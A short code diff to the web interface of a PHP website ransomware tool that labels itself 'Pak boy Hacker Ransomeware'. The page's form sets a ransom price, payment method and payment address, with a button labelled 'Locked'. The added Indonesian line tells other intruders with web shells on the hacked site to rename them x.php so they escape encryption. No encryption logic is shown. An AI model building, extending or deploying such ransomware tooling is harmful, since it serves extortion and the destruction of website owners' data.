@@ -133,6 +133,7 @@ payment via : <select style=" border: 1px solid #15CFF4;
 </select>&nbsp&nbsp&nbspYour Price :&nbsp&nbsp $<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="price"><br><br>&nbsp&nbsppayment address : <input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="add">&nbsp&nbspYour Team :&nbsp<input type="text" style="color: yellow;font-family: Iceland;font-size: 15" name="team">
 <br><br>
 <input type="submit" class="submite" value="Locked">
-</form></font>
+</form></font><br>
+<small><font color="yellow">jika anda memiliki shell di web ini dan tidak mau ikut ke enc ubah nama shell anda menjadi x.php</font></small>
 <hr>
 <address><small><font color="yellow">Pak boy Hacker Ransomeware >> Remake by ./p3mu14 </font></small></address>
